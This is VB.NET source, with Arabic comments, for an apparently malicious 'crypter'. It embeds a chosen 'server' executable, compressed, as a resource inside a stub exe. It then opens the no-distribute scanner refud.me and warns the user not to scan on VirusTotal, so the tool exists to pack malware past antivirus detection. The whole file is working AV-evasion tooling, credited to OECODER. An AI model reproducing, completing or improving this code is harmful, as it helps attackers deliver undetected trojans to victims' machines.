﻿Imports System.IO
'اقسم بالله انني سأذكر حقوق صاحب البرنامج السورس OECODER



Public Class Form1

    Private Sub ReconButton2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ReconButton2.Click
        'السيرفر المراد تشفيره
        Dim OpenFD As New OpenFileDialog
        With OpenFD
            .Title = "Choose file to crypt!"
            .Filter = "Executables |*.exe"
            .ShowDialog()
        End With
        TxtBox1.Text = OpenFD.FileName
    End Sub

    Private Sub ReconButton5_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ReconButton5.Click
        'الستب
        Dim OpenFD As New OpenFileDialog
        With OpenFD
            .Title = "Choose Stub"
            .Filter = "Executables |*.exe"
            .ShowDialog()
        End With
        TxtBox3.Text = OpenFD.FileName
    End Sub

    Private Sub ReconButton1_Click(sender As Object, e As EventArgs) Handles ReconButton1.Click
        End
    End Sub

    Private Sub ReconButton4_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ReconButton4.Click
        'تحديد حفظ السيرفر
        ReconBar1.Value = "15"
        If TxtBox3.Text = "" Then
            MessageBox.Show("Stub not found! ")
            End
        End If
        Dim kbytes() As Byte
        Dim ebytes() As Byte
        Dim SVD As New SaveFileDialog
        With SVD
            .Title = "Set output File"
            .Filter = "Executables |*.exe"
            .ShowDialog()
        End With

        kbytes = IO.File.ReadAllBytes(TxtBox1.Text)
        ReconBar1.Value = "37"
        ReconBar1.Increment(25)
        ebytes = Compression.Compress(kbytes)
        IO.File.WriteAllBytes(SVD.FileName, My.Resources.stub)
        WriteResource(SVD.FileName, ebytes)
        ReconBar1.Value = "100"
        Process.Start("http://www.refud.me/scan.php")
        MsgBox("لا تفحص في VirusTotal!!")
        MsgBox("www.dev-point.com | OECODER")
    End Sub


    Private Sub ReconButton3_Click(sender As Object, e As EventArgs)
    End Sub

    Private Sub ReconCheck2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
    End Sub

    Private Sub ReconCheck3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub TxtBox2_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)
    End Sub

    Private Sub ReconForm1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ReconForm1.Click

    End Sub
End Class
